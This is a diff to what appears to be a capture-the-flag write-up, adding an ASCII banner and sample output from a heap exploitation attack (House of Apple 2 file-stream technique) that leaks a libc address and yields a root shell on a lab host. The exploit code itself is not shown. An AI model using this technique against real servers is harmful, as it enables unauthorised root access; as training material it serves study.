@@ -274,11 +274,47 @@ r.interactive()  # Shell!
 When the exploit succeeds:
 
 ```bash
+╔════════════════════════════════════════════════════════════╗
+║                                                            ║
+║      ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗ ║
+║      ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝ ║
+║      █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║    ║
+║      ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║    ║
+║      ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║    ║
+║      ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝    ║
+║                                                            ║
+║    Heap Exploitation + FSOP RCE | Root Flag Capture        ║
+║                                                            ║
+╚════════════════════════════════════════════════════════════╝
+
+[*] Binary: ./server
+[*] Libc: ./libc.so.6
+[*] Exit offset: 0x43120
+[*] Stdout offset: 0x21a6c0
+
+[*] Attempting: heap=0x3, libc=0xb
+[+] Opening connection to 10.49.149.223 on port 9004: Done
+[*] [PHASE 1] Heap grooming...
+[+] [PHASE 1] Heap corruption complete!
+
+[*] [PHASE 2] Leaking libc address...
+[+] [PHASE 2] Libc base: 0x7f2c8a800000
+
+[*] [PHASE 3] Building House of Apple 2 payload...
+[*] [PHASE 3] Payload size: 456 bytes
+[+] [PHASE 3] Payload delivered! RCE triggered!
+[+] [✓] Exploit successful! Entering interactive shell...
+
+#This is just a sample output the actual output will take time .... 
+
+[*] Switching to interactive mode
 $ id
 uid=0(root) gid=0(root) groups=0(root)
 
-# We're already root! The exploit itself gave us root shell.
-# This is because the `server` binary runs as setuid root.
+$ whoami
+root
+# The server was alredy running with root privilages. 
+
 ```
 
 ### Extracting the Flag
